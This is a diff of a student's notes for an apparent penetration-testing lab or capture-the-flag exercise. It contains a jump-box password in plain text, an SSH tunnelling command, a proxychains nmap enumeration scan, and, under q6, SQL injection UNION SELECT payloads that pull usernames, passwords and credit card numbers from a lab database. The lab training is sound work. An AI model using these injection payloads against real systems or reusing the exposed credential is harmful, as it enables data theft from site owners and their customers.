@@ -1,10 +1,8 @@
-MS setup: 
-
-JB Password:
+# JB Password:
 ```
 v0cEcUbwIzY878p
 ```
-
+# MS setup: 
 ```
 ssh -MS /tmp/jump student@10.50.37.98	     
 
@@ -44,19 +42,19 @@ proxychains nmap --script http-enum 10.100.28.55
     ```
 
 
-
-q6 * Utilizing the input field on DNLA budget page, find the flag associated with credit cards. To answer the question enter only the characters inside the flag.
+## q6 * Utilizing the input field on DNLA budget page, find the flag associated with credit cards. To answer the question enter only the characters inside the flag.
 ```
 
 127.0.0.1:1111/cases/productsCategory.php?category=13 UNION SELECT username,password,permission from sqlinjection.members
 
 'UNION SELECT id,creditcard_number,order from sqlinjection.payments' query
 
-
-```
-q7 * Find the flag associated with id 1337.
 ```
 
+
+## q7 * Find the flag associated with id 1337.
 ```
-q8 * Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.
+
+```
+## q8 * Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.
 (meh !! I ain't pressed)
